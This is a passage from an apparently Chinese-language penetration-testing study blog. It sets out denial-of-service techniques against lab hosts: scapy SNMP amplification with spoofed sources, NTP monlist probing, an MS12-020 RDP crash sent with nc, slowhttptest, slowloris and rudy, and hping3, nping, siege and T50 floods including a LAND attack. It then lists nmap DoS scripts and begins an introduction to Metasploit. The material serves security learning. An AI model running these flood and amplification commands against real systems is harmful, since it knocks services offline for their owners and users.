alt="img"></p><p>5.拼接数据包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/d)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r</span><br></pre></td></tr></table></figure><p><img src="BYH2G1x.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure><p><img src="mjWweAd.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.src=<span class="string">"10.10.10.141"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/d)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br></pre></td></tr></table></figure><p>6.发送数据包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; send(r)</span><br></pre></td></tr></table></figure><p>发送 60 字节的数据包，返回 2；l30 字节的数据包</p><p><img src="j8EXlRY.png" alt="img"></p><h3 id="拒绝服务——SNMP服务"><a href="#拒绝服务——SNMP服务" class="headerlink" title="拒绝服务——SNMP服务"></a>拒绝服务——SNMP服务</h3><h4 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>简单网络管理协议</li><li>Simmple Network Management Protocol<ul><li>一般用来监控和管理网络设备</li></ul></li><li>服务端口UDP 161/162<ul><li>管理站(manager/客户端)、被管理设备(agent/服务端)</li><li>管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li><li>每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库</li></ul></li><li>攻击原理</li><li>请求流量小，查询结果返回流量大<ul><li>结合伪造源地址实现攻击</li></ul></li></ul><h4 id="2-安装SNMP"><a href="#2-安装SNMP" class="headerlink" title="2.安装SNMP"></a>2.安装SNMP</h4><ul><li>安装 SNMP，定义 community</li></ul><p><img src="okOSYrp.png" alt="img"></p><p><img src="TZf6kGU.png" alt="img"></p><p><img src="aH8IJJ2.png" alt="img"></p><h4 id="3-scapy构造数据包"><a href="#3-scapy构造数据包" class="headerlink" title="3.scapy构造数据包"></a>3.scapy构造数据包</h4><ul><li>流程</li></ul><p><img src="28X1RdW.png" alt="img"></p><ul><li>步骤</li></ul><p><strong>构造 IP 数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.142"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="mDZkeVN.png" alt="img"></p><p><strong>构造 UDP 数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; u=UDP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.dport=<span class="number">161</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.sport=<span class="number">161</span></span><br></pre></td></tr></table></figure><p><img src="wq7hyEF.png" alt="img"></p><p><strong>构造 SNMP 数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s=SNMP()</span><br></pre></td></tr></table></figure><p><img src="LGtwfwK.png" alt="img"></p><p><strong>设置放大倍数</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b=SNMPbulk()</span><br><span class="line">&gt;&gt;&gt; b.max_repetitions=<span class="number">100</span></span><br><span class="line">&gt;&gt;&gt; b.varbindlist=[SNMPvarbind(oid=ASN1_OID('<span class="number">1.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span>')),SNMPvarbind(oid=ASN1_OID('<span class="number">1.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.19</span><span class="number">.1</span><span class="number">.3</span>'))]</span><br><span class="line">&gt;&gt;&gt; b.display()</span><br></pre></td></tr></table></figure><p><img src="9Z7Rq86.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure><p><img src="3m6lmhQ.png" alt="img"></p><p><strong>设置 SNMP 数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.PDU=b</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure><p><img src="d0jMjxp.png" alt="img"></p><p><strong>合成完整数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br></pre></td></tr></table></figure><p><strong>发送数据包</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure><p>发送 98 字节，返回 4534 字节的数据包</p><p><img src="nJUfGfh.png" alt=""></p><p><strong>测试放大200倍效果</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; b.max_repetitions=<span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.PDU=b</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure><p><img src="1deTNBV.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure><p>发送 99 字节，返回 8894 字节</p><p><img src="e2RFmyd.png" alt="img"></p><h3 id="拒绝服务——NTP-放大攻击"><a href="#拒绝服务——NTP-放大攻击" class="headerlink" title="拒绝服务——NTP 放大攻击"></a>拒绝服务——NTP 放大攻击</h3><h4 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>网络时间协议<ul><li>Network Time Protocol</li><li>保证网络设备时间同步</li><li>电子设备互相干扰导致时钟差异越来越大</li><li>影响应用正常运行、日志审计不可信</li><li>服务端口UDP 123</li></ul></li><li>攻击原理<ul><li>NTP 服务提monlist (MON_GETLIST) 查询功能<ul><li>监控NTP 服务器的状况 </li></ul></li></ul></li><li>客户端查询时，NTP服务器返回最后同步时间的600 个客户端IP</li><li>每6个IP一个数据包，最多100个数据包(放大约100倍)</li></ul><h4 id="2-扫描NTP服务器"><a href="#2-扫描NTP服务器" class="headerlink" title="2.扫描NTP服务器"></a>2.扫描NTP服务器</h4><p>1.服务器安装 ntp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@xu:~# apt-<span class="builtin-name">get</span> install ntp</span><br><span class="line">root@xu:~# netstat -tulnp | grep 123</span><br></pre></td></tr></table></figure><p>2.kali扫描发现http服务器</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap -sU -p <span class="number">123</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span> --open</span><br><span class="line"><span class="symbol">root@</span>kali:~# nmap -sU -p <span class="number">123</span> -sV <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br></pre></td></tr></table></figure><p>3.kali 扫描发现漏洞</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -n -c monlist <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span>: timed <span class="keyword">out</span>, nothing received</span><br><span class="line">***Request timed <span class="keyword">out</span>    # 说明不存在漏洞</span><br></pre></td></tr></table></figure><p>4.配置 ntp 服务器配置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注释 38 和 39行</span><br><span class="line"><span class="comment"># restrict -4 default kod notrap nomodify nopeer noquery limited</span></span><br><span class="line"><span class="comment"># restrict -6 default kod notrap nomodify nopeer noquery limited</span></span><br><span class="line">root@xu:~# /etc/init.d<span class="built_in">/ntp </span>restart</span><br></pre></td></tr></table></figure><p>5.kali 扫描发现漏洞</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -n -c monlist <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# ntpq -c rv <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -c sysinfo <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br></pre></td></tr></table></figure><h4 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3.防御策略"></a>3.防御策略</h4><ul><li>NTP 攻击策略<ul><li>升级到 ntpd 4.2.7p26 及以上版本（默认关闭 monlist 查询）</li><li>手动关闭 monlist 查询功能</li></ul></li></ul><h3 id="拒绝服务–应用层DoS-攻击"><a href="#拒绝服务–应用层DoS-攻击" class="headerlink" title="拒绝服务–应用层DoS 攻击"></a>拒绝服务–应用层DoS 攻击</h3><ul><li>应用服务漏洞<ul><li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li><li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li></ul></li><li>缓冲区溢出漏洞<ul><li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li><li>影响: 远程代码执行、DOS</li><li>利用模糊测试方法发现缓冲区溢出漏洞</li></ul></li><li>CesarFTP 0.99 服务漏洞<ul><li>ftp_fuzz.py # MKD/RMD</li></ul></li><li>MS12-020 远程桌面协议DOS漏洞</li></ul><h4 id="2-攻击测试-MS12-020"><a href="#2-攻击测试-MS12-020" class="headerlink" title="2. 攻击测试 MS12-020"></a>2. 攻击测试 MS12-020</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># searchsploit ms12-020</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/exploitdb/exploits/windows/dos/18606.txt .</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># mv 18606.txt  MS12-020.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># leafpad MS12-020.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc 10.10.10.141 3389 &lt; termdd_1.dat</span></span><br></pre></td></tr></table></figure><h4 id="3-Slowhttptest"><a href="#3-Slowhttptest" class="headerlink" title="3. Slowhttptest"></a>3. Slowhttptest</h4><ul><li><p>Slowhttptest (源自google)</p><ul><li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li><li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li><li>尤其擅长攻击apache.tomcat (几乎百发百中)</li></ul></li><li><p>攻击方法</p><ul><li>Apache Range Header attack<ul><li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li><li>耗尽服务器CPU、内存资源</li></ul></li></ul></li><li><p>ulimite -n 70000</p></li><li><p>HTTP Post 攻击模式</p><ul><li>slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 10 -p 3</li></ul></li><li><p>slowloris 攻击模式</p><ul><li>slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 24 -p 3</li></ul></li><li><p>支持代理</p></li><li><p>大量应用服务器和安全设备都无法防护慢速攻击</p></li></ul><p><img src="Zc2XbBy.jpg" alt="img"></p><h4 id="4-攻击测试"><a href="#4-攻击测试" class="headerlink" title="4.攻击测试"></a>4.攻击测试</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@kali:~#</span> <span class="string">slowhttptest</span> <span class="string">-c</span> <span class="number">60000</span> <span class="string">-B</span> <span class="string">-g</span> <span class="string">-o</span> <span class="string">body_stats</span> <span class="string">-i</span> <span class="number">110</span> <span class="string">-r</span> <span class="number">200</span> <span class="string">-s</span> <span class="number">8192</span> <span class="string">-t</span> <span class="string">FAKEVERB</span> <span class="string">-u</span> <span class="string">http://10.10.10.132</span> <span class="string">-x</span> <span class="number">10</span> <span class="string">-p</span> <span class="number">3</span> <span class="string">-l</span> <span class="number">999999</span></span><br></pre></td></tr></table></figure><p><img src="z8Bx42G.png" alt="img"></p><p><img src="ptFr6br.png" alt="img"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# slowhttptest -c <span class="number">1000</span> -H -g -o my_header_stats -i <span class="number">10</span> -r <span class="number">200</span> -s <span class="number">8192</span> -t GET -u http:<span class="comment">//10.10.10.132 -x 10 -p 3</span></span><br></pre></td></tr></table></figure><p><img src="q8f1NkR.png" alt="img"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># man slowhttptest</span></span><br></pre></td></tr></table></figure><h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a>拒绝服务攻击工具</h3><h4 id="1-rudy"><a href="#1-rudy" class="headerlink" title="1.rudy"></a>1.rudy</h4><h5 id="1-简介-6"><a href="#1-简介-6" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li><li>每次只传输一个字节的数据、</li><li>美剧黑客军团”中曾提到此攻击手段</li><li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li><li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li></ul><h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/rudy</span><span class="comment"># ls</span></span><br><span class="line">BeautifulSoup.py   README          r-u-dead-yet-v2.<span class="number">2</span>.py  socks.pyc</span><br><span class="line">BeautifulSoup.pyc  rudeadyet.conf  socks.py</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p><img src="tdPvToI.png" alt="img"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/rudy</span><span class="comment"># ./r-u-dead-yet-v2.2.py</span></span><br></pre></td></tr></table></figure><p><img src="ilCKVV2.png" alt="img"></p><p><img src="eo46mKo.png" alt="img"></p><h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><h5 id="1-简介-7"><a href="#1-简介-7" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li><p>几乎可以定制发送任何 TCP/IP 数据包，用于测试 FW、端口扫描、性能测试</p></li><li><p>syn flood 攻击</p><ul><li>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 10.10.10.132</li><li>hping3 -S -P -U -p 80 –flood –rand-source 10.10.10.132</li><li>hping3 -SARFUP -p 80 –flood –rand-source 10.10.10.132 (TCP Flood)</li></ul></li><li><p>ICMP Flood 攻击</p><ul><li>hping3 -q -n -a 1.1.1.1 –icmp -d 200 –flood 10.10.10.132</li></ul></li><li><p>UDP Flood 攻击</p><ul><li>hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 –flood 10.10.10.132</li></ul></li></ul><h5 id="2-攻击-1"><a href="#2-攻击-1" class="headerlink" title="2.攻击"></a>2.攻击</h5><ul><li><p>syn_flood 攻击</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -c <span class="number">1000</span> -d <span class="number">120</span> -S -w <span class="number">64</span> -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="ptoKirq.png" alt="img"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S -P -U -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><p><img src="qykXjba.png" alt="img"></p><ul><li><p>tcp_flood 攻击</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -SARFUP -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="TX0DsTz.png" alt="img"></p><ul><li><p>icmp_flood 攻击</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-a 伪造源地址</span><br><span class="line"><span class="symbol">root@</span>kali:~# hping3 -q -n -a <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> --icmp -d <span class="number">200</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><p><img src="j82vMQQ.png" alt="img"></p></li><li><p>udp_flood 攻击</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -a <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> --udp -s <span class="number">53</span> -d <span class="number">100</span> -p <span class="number">53</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><p><img src="yh6OGJ9.png" alt="img"></p></li></ul><h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><ul><li><p>特殊种类的 SYN Flood 攻击</p></li><li><p>源地址和目的地址都是靶机IP，受害者和自己完成三次握手</p></li><li><p>hping3 -n -a 10.10.10.132 -S -d 100 -p 80 –flood 10.10.10.132</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -n -a <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -S -d <span class="number">100</span> -p <span class="number">80</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><p><img src="3YN6wrP.png" alt="img"></p></li></ul><h3 id="3-nping"><a href="#3-nping" class="headerlink" title="3.nping"></a>3.nping</h3><ul><li><p>TCP 全连接 DoS 攻击</p><ul><li>nping –tcp-connect –rate=10000 -c 1000000000 -q 10.10.10.132</li></ul></li><li><p>查公网 IP</p><ul><li>nping –echo-client “public” echo.nmap.org –udp</li></ul></li></ul><h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><ul><li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p></li><li><p>siege -g <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a></p></li><li><p>siege -i -c 1000 <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -A siegehttp</p></li><li><p>同时攻击多个 url ，使用 -f 调用字典文件</p></li><li><p>单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）</p><ul><li><p>/etc/siege/urls.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 banner 信息</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># siege -g http://10.10.10.132</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p><img src="Seky1di.png" alt="img"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:<span class="symbol">~# siege -i -c 1000 http</span>:<span class="comment">//10.10.10.132 -A Mozilla/5.0</span></span><br></pre></td></tr></table></figure><p><img src="8d3o6st.png" alt="img"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /etc/siege/urls.txt</span></span><br></pre></td></tr></table></figure><p><img src="ccML8at.png" alt="img"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># siege -i -c 1000</span></span><br></pre></td></tr></table></figure><p><img src="FdDymAj.png" alt="img"></p><h3 id="5-T50"><a href="#5-T50" class="headerlink" title="5.T50"></a>5.T50</h3><ul><li><p>网络压力测试</p><ul><li><p>t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80</p></li><li><p>t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# t50 <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> --flood --turbo -S --protocol TCP --dport <span class="number">80</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p><img src="NzK2wiZ.png" alt="img"></p><p><img src="wJiBiqD.png" alt="img"></p><h4 id="6-NMAP"><a href="#6-NMAP" class="headerlink" title="6.NMAP"></a>6.NMAP</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d <span class="string">"\""</span> -f <span class="number">2</span></span><br><span class="line">broadcast-avahi-dos.nse</span><br><span class="line">http-slowloris.nse</span><br><span class="line">ipv6-ra-flood.nse</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-vuln-conficker.nse</span><br><span class="line">smb-vuln-cve2009<span class="number">-3103.</span>nse</span><br><span class="line">smb-vuln-ms06<span class="number">-025.</span>nse</span><br><span class="line">smb-vuln-ms07<span class="number">-029.</span>nse</span><br><span class="line">smb-vuln-ms08<span class="number">-067.</span>nse</span><br><span class="line">smb-vuln-ms10<span class="number">-054.</span>nse</span><br><span class="line">smb-vuln-regsvc-dos.nse</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;拒绝服务常见的攻击方式总结&quot;&gt;&lt;a href=&quot;#拒绝服务常见的攻击方式总结&quot; class=&quot;headerlink&quot; title=&quot;拒绝服务常见的攻击方式总结&quot;&gt;&lt;/a&gt;拒绝服务常见的攻击方式总结&lt;/h2&gt;&lt;h4 id=&quot;1-拒绝服务简介&quot;&gt;&lt;a href=&quot;#1
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="拒绝服务" scheme="https://shu1l.github.io/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Mestasploit基本使用学习</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</id>
    <published>2020-04-03T11:52:51.000Z</published>
    <updated>2020-04-30T12:55:34.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul><li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li><li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li><li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li></ul><h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul><li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p></li><li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p><ul><li>框架继承了渗透测试标准（PETS）标准</li><li>一定程度上统一了渗透测试研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul></li><li><p>开发活跃版本更新频繁</p><ul><li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li><li>目前分化为四个版本，社区版依然十分活跃</li><li>HD More说：为 Metasploit 写书是种自虐</li></ul></li><li><p>Metasploit 默认集成 kali linux 中</p></li><li><p>使用 postgresql 数据库存储数据</p><ul><li>早期版本需要先启动数据库再启动 msf</li></ul><p><img src="zXzemZd.png" alt="img"></p></li></ul><p><img src="mgJH3KP.jpg" alt="img"></p><h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li><li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>Msf::Core<ul><li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li></ul></li><li>Msf::Base<ul><li>提供友好的的 API 接口，便于模块调用的库</li></ul></li><li>Plugin 插件<ul><li>连接和调用外部扩展功能和系统</li></ul></li><li>模块<ul><li>/usr/share/metasploit-framework/modules/</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li></ul></li><li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul><li>shellcode 或系统命令</li><li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li><li>Single：all-in-one</li><li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li><li>stages：利用 stager 建立的连接下载的后续payload</li><li>stager、stages 都有多种类型，适用于不同场景</li><li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li><li>Encoders：对 payload 进行加密，躲避 AV 